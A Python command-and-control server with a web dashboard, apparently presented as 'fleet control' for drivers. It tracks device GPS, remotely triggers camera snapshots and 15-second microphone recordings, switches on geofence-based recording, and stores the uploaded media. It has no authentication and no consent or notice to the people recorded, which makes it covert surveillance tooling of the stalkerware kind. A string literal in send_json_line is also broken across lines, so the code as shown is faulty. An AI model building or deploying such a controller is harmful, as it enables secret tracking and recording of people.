#!/usr/bin/env python3
import asyncio
import json
import os
import time
import base64
from datetime import datetime
from urllib.parse import parse_qs, urlparse

TCP_PORT = 9090
HTTP_PORT = 8080
MEDIA_DIR = "captured_media"
os.makedirs(MEDIA_DIR, exist_ok=True)

clients = {}
geofence = {"lat": 28.6139, "lon": 77.2090, "radius_m": 500.0, "active": False}

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SM Master Control Panel</title>
<style>
  body { background: #0d1117; color: #e6edf3; font-family: system-ui, sans-serif; margin: 0; padding: 16px; }
  h2 { color: #58a6ff; margin-top: 0; border-bottom: 1px solid #30363d; padding-bottom: 8px; }
  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
  .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #3fb950; margin-right: 8px; }
  button { background: #238636; color: #fff; border: none; padding: 8px 12px; border-radius: 6px; font-weight: 600; cursor: pointer; margin: 4px 2px; }
  button.cmd-btn { background: #1f6feb; }
  button.danger { background: #da3633; }
  input { background: #0d1117; border: 1px solid #30363d; color: #fff; padding: 8px; border-radius: 6px; width: calc(33% - 12px); margin-right: 4px; }
  .log-box { font-family: monospace; font-size: 12px; background: #010409; padding: 10px; border-radius: 6px; max-height: 220px; overflow-y: auto; }
</style>
</head>
<body>
  <h2>SM Master Fleet Control Center</h2>
  <div class="card">
    <h3>Geofence Auto-Trigger Module</h3>
    <input type="number" step="any" id="gf_lat" placeholder="Latitude (28.6139)">
    <input type="number" step="any" id="gf_lon" placeholder="Longitude (77.2090)">
    <input type="number" id="gf_rad" placeholder="Radius (Meters)">
    <div style="margin-top:8px;">
      <button onclick="setGeofence(true)">Enable Geofence</button>
      <button class="danger" onclick="setGeofence(false)">Disable</button>
    </div>
    <div id="gf_status" style="margin-top:6px;font-size:12px;color:#58a6ff;"></div>
  </div>
  <div class="card">
    <h3>Connected Drivers (Live)</h3>
    <div id="driver_list">Loading connected devices...</div>
  </div>
  <div class="card">
    <h3>Synced Media & Logs</h3>
    <div class="log-box" id="server_logs">Ready.</div>
  </div>
<script>
async function refreshState() {
  const res = await fetch('/api/state');
  const data = await res.json();
  document.getElementById('gf_status').innerText = `Active: ${data.geofence.active} | Zone: (${data.geofence.lat}, ${data.geofence.lon}) R=${data.geofence.radius_m}m`;
  const container = document.getElementById('driver_list');
  const keys = Object.keys(data.clients);
  if (keys.length === 0) {
    container.innerHTML = '<p style="color:#8b949e;">No active handshakes yet.</p>';
  } else {
    container.innerHTML = keys.map(id => {
      const c = data.clients[id];
      return `<div style="border-bottom:1px solid #30363d;padding:10px 0;">
        <div><span class="status-dot"></span><strong>${c.name}</strong> (${id})</div>
        <div style="font-size:12px;color:#8b949e;margin:4px 0;">GPS: ${c.lat.toFixed(5)}, ${c.lon.toFixed(5)} | In Zone: <b>${c.in_zone ? 'YES (RECORDING)' : 'NO'}</b></div>
        <button class="cmd-btn" onclick="sendCmd('${id}', 'SNAP_CAM')">Snapshot</button>
        <button class="cmd-btn" onclick="sendCmd('${id}', 'REC_MIC_15S')">Mic (15s)</button>
      </div>`;
    }).join('');
  }
  document.getElementById('server_logs').innerHTML = data.logs.map(l => `<div>${l}</div>`).join('');
}
async function sendCmd(id, action) { await fetch(`/api/cmd?id=${encodeURIComponent(id)}&action=${encodeURIComponent(action)}`); refreshState(); }
async function setGeofence(active) {
  const lat = document.getElementById('gf_lat').value || 28.6139;
  const lon = document.getElementById('gf_lon').value || 77.2090;
  const rad = document.getElementById('gf_rad').value || 500;
  await fetch(`/api/geofence?lat=${lat}&lon=${lon}&radius=${rad}&active=${active ? 1 : 0}`);
  refreshState();
}
setInterval(refreshState, 2500);
refreshState();
</script>
</body>
</html>
"""

event_logs = []
def log_event(msg):
    stamp = datetime.now().strftime("%H:%M:%S")
    entry = f"[{stamp}] {msg}"
    print(entry, flush=True)
    event_logs.insert(0, entry)
    if len(event_logs) > 80: event_logs.pop()

async def send_json_line(writer, payload):
    try:
        writer.write((json.dumps(payload) + "
").encode("utf-8"))
        await writer.drain()
    except Exception as e:
        log_event(f"Write error: {e}")

async def handle_client(reader, writer):
    addr = writer.get_extra_info('peername')
    driver_id = None
    try:
        while True:
            line = await reader.readline()
            if not line: break
            msg = json.loads(line.decode("utf-8", errors="replace").strip())
            mtype = msg.get("type")
            if mtype == "HANDSHAKE":
                driver_id = str(msg.get("driver_id", "DRV001"))
                name = str(msg.get("name", "Unknown"))
                clients[driver_id] = {"writer": writer, "name": name, "lat": 0.0, "lon": 0.0, "last_seen": time.time(), "in_zone": False}
                log_event(f"CONNECTED: {name} ({driver_id}) from {addr}")
                await send_json_line(writer, {"type": "GEOFENCE_CFG", **geofence})
            elif mtype == "TELEMETRY" and driver_id in clients:
                clients[driver_id]["lat"] = float(msg.get("lat", 0.0))
                clients[driver_id]["lon"] = float(msg.get("lon", 0.0))
                clients[driver_id]["in_zone"] = bool(msg.get("in_zone", False))
                clients[driver_id]["last_seen"] = time.time()
            elif mtype == "MEDIA_UPLOAD" and driver_id in clients:
                kind = msg.get("media_type", "bin")
                ext = "jpg" if kind == "IMAGE" else "m4a"
                fname = f"{MEDIA_DIR}/{driver_id}_{int(time.time())}.{ext}"
                with open(fname, "wb") as f: f.write(base64.b64decode(msg.get("payload", "")))
                log_event(f"MEDIA SYNCED ({kind}): Saved to {fname}")
    except Exception as e:
        log_event(f"Connection dropped ({driver_id}): {e}")
    finally:
        if driver_id and driver_id in clients: del clients[driver_id]
        writer.close()

async def handle_http(reader, writer):
    try:
        req_line = await reader.readline()
        if not req_line:
            writer.close()
            return
        parts = req_line.decode("utf-8", errors="ignore").split(" ")
        path = parts[1] if len(parts) > 1 else "/"
        while True:
            hdr = await reader.readline()
            if not hdr or hdr == b"\r\n": break
        parsed = urlparse(path)
        qs = parse_qs(parsed.query)
        if parsed.path == "/api/state":
            clean = {k: {"name": v["name"], "lat": v["lat"], "lon": v["lon"], "in_zone": v["in_zone"]} for k, v in clients.items()}
            body = json.dumps({"clients": clean, "geofence": geofence, "logs": event_logs[:30]}).encode("utf-8")
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
        elif parsed.path == "/api/cmd":
            target_id = qs.get("id", [""])[0]
            action = qs.get("action", [""])[0]
            if target_id in clients:
                await send_json_line(clients[target_id]["writer"], {"type": "COMMAND", "action": action})
                log_event(f"SENT COMMAND [{action}] -> {clients[target_id]['name']}")
            body = b'{"ok":true}'
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 11\r\n\r\n" + body)
        elif parsed.path == "/api/geofence":
            geofence["lat"] = float(qs.get("lat", [28.6139])[0])
            geofence["lon"] = float(qs.get("lon", [77.2090])[0])
            geofence["radius_m"] = float(qs.get("radius", [500.0])[0])
            geofence["active"] = qs.get("active", ["0"])[0] == "1"
            log_event(f"GEOFENCE UPDATED: {geofence}")
            for cid, cdata in list(clients.items()):
                await send_json_line(cdata["writer"], {"type": "GEOFENCE_CFG", **geofence})
            body = b'{"ok":true}'
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 11\r\n\r\n" + body)
        else:
            body = DASHBOARD_HTML.encode("utf-8")
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
        await writer.drain()
    except Exception:
        pass
    finally:
        writer.close()

async def main():
    tcp_srv = await asyncio.start_server(handle_client, "0.0.0.0", TCP_PORT)
    http_srv = await asyncio.start_server(handle_http, "0.0.0.0", HTTP_PORT)
    log_event(f"Server started -> Admin UI: http://0.0.0.0:{HTTP_PORT} | Client TCP: {TCP_PORT}")
    async with tcp_srv, http_srv:
        await asyncio.gather(tcp_srv.serve_forever(), http_srv.serve_forever())

if __name__ == "__main__":
    asyncio.run(main())
